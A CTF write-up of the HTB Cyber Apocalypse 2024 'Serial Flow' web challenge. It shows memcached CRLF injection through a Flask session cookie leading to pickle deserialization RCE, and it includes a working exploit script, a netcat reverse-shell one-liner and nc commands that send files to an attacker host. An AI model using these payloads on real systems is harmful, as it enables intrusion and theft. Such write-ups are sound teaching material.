---
title: "[web] Serial Flow"
date: 2024-03-24T16:00:00+08:00
summary: HTB Cyber apocalypse 2024 - pickle and cookie
draft: false
tags: [ "ctf", "web" ]
---

This challenge exposes a website written with flask, and display a pretty cool looking terminal like interface, but not much functionalities. Looking at the code, there's only 2 endpoints exposed, a home page on route '/' and a '/set' route, that allows a user to change the ui color.

To keep the ui color, a session is used, with a cookie containing a session id, and a backend session, in this case, the session is using a memcached backend.

With as little available to tinker with, issue might be with the session management in memcached, also session in flask_session is using pickle to unserialize a session, (Name of the challenge is also serial flow).

A good plan would be to write in a memcached key a RCE with pickle, and trigger flask_session to read that key and deserialize it, which would then execute an RCE.

As a first step, I tried to write in a different key in memcached, directly with pylibmc, after several tries and some research, we can leverage the text protocol used by memcached to communicate with the server over the network.

Setting a key in memcached looks like the following:

```
set key 0 300 5\r\n
hello\r\n
```
* 0 : is a flag that will be return on read
* 300 : is the ttl of the key
* 5 : length of the value stored, in this case 5 for hello
* separator between command is \r\n 

When using pylibmc, it's hiding this but is using the same system, some tcpdump shows the same flow on the wire.

Let's write some tests to try to exploit that, I first tried to use a SET to overwrite another key:
```python
Python 3.11.4 (main, Mar 13 2024, 13:05:57) [Clang 15.0.0 (clang-1500.1.0.2.5)] on darwin
Type "help", "copyright", "credits" or "license" for more information.
>>> import pylibmc
>>> mc = pylibmc.Client(["127.0.0.1:11211"])
>>> mc.set("key","aaa")
True
>>> mc.get("key")
'aaa'
>>> mc.set("key","aaa\r\nset key2 0 300 5\r\nhello\r\n")
True
>>> mc.get("key2")
>>> mc.get("key")
'aaa\r\nset key2 0 300 5\r\nhello\r\n'
>>>
```

As seen, it does not work, this is because pylibmc set the length of the content, so the "exploit" end up being the value of the first key, however, a get command does not need anything after the key, let's try with that:
```python
Python 3.11.4 (main, Mar 13 2024, 13:05:57) [Clang 15.0.0 (clang-1500.1.0.2.5)] on darwin
Type "help", "copyright", "credits" or "license" for more information.
>>> import pylibmc
>>> mc = pylibmc.Client(["127.0.0.1:11211"])
>>> mc.delete('key')
False
>>> mc.delete('key2')
False
>>> mc.get("key\r\nset key2 0 300 5\r\nhello\r\n")
>>> mc.get("key2")
>>> mc.get("key2")
>>> mc.get("key2")
>>> mc.get("key2")
b'hello'
```
As displayed there, behaviour is a bit erratic, but the "key2" is set through a get on "key".

Looking at flask session, we see that the cookie session contains the session id, and upon loading a page, this session id will be used (with a prefix) to read session content from memory, using a get on pylibmc, if we were able to pass "key\r\nset key2 0 300 5\r\nhello\r\n" as a cookie value, we would be able to set a key by setting the session id in the cookie.

However, this is not as simple, I spent a lot of time on this step, I could not manage to send special characters to the backend through the cookie, after a lot of back end forth, I realize this should probably be encoded, so why not let python encode those value for me, with the "http.cookies" library.

```python
Python 3.11.4 (main, Mar 13 2024, 13:05:57) [Clang 15.0.0 (clang-1500.1.0.2.5)] on darwin
Type "help", "copyright", "credits" or "license" for more information.
>>> from http import cookies
>>> c = cookies.SimpleCookie()
>>> c["session"] = "key\r\nset key2 0 300 5\r\nhello\r\nget key2"
>>> print(c.output(header="Cookie:"))
Cookie: session="key\015\012set key2 0 300 5\015\012hello\015\012get key2"
>>>
```

We are almost there, as the key will be loaded with pickle, we can directly use pickle to deserialize an object, and use the __reduce__ function to execute code.

This is the second step where I lost a lot of time, I tried to get a reverse shell for quite some time, without success. The image used by the application is alpine with busybox, after quite some trial and error and using the docker version of the challenge available for download, I was able to trigger a reverse shell, when running a command in the container through docker exec, with
```
mkfifo /tmp/f ;  cat /tmp/f | /bin/sh -i 2>&1 | nc MY_PUBLIC_IP 4444 > /tmp/f
```
However, I was not able to run it through the cookie, simpler command were working sometime, but not everytime, I ended up building a small script to directly execute one command, and use that after:

```python
import pickle
import os
from http import cookies
import sys

if len(sys.argv) < 2:
    print("Command expected")
    exit()

cmd = sys.argv[1]

class RCE:
    def __reduce__(self):
        return os.system, (cmd,)

payload = pickle.dumps(RCE(), 0)
size = len(payload)
cookie = 'k\r\nset k2 0 300 ' + str(size) + '\r\n'
cookie += payload.decode() + '\r\n'
cookie += 'get k2'

c = cookies.SimpleCookie()
c["session"] = cookie
print(c.output(header="Cookie:"))
```

and after running multiple times:

```
http 83.136.250.41:48022  "$(python exploit.py 'ls / | nc MY_PUBLIC_IP 4444')"
```

I got:

```
pierre@pierre-pc:~$ nc -nlvp 4444
Listening on 0.0.0.0 4444
Connection received on 83.136.250.41 36527
app
bin
dev
entrypoint.sh
etc
flag88eb3765b9.txt
home
lib
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
```

then running :

```
http 83.136.250.41:48022 "$(python exploit.py 'cat /flage2c0f61ee4.txt | nc MY_PUBLIC_IP 4444')"
```

I got:

```
pierre@pierre-pc:~$ nc -nlvp 4444
Listening on 0.0.0.0 4444
Connection received on 83.136.250.41 40107
HTB{y0u_th0ught_th15_wou1d_b3_s1mpl3?}pierre@pierre-pc:~$
```

